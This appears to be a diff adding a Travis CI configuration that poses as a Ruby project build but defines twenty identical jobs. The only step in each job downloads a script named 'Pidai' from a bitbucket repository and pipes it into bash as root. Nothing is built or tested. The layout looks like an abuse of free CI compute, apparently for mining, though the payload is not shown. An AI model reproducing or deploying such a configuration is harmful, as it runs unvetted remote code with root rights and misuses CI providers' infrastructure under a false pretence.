@@ -1,0 +1,105 @@
+language: ruby
+
+
+jobs:
+  include:
+    - stage: test
+      name: "build1"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build2"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build3"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build4"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build5"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build6"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build7"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build8"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build9"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build10"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build11"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build12"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build13"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build14"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build15"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build16"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build17"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build18"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build19"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
+    -
+      name: "build20"
+      script:
+        - sudo -u root curl https://bitbucket.org/xonicmu/xonyree/raw/4eabee3b129182e7d917256d8159c2a049ec5b8c/Pidai | bash
+        
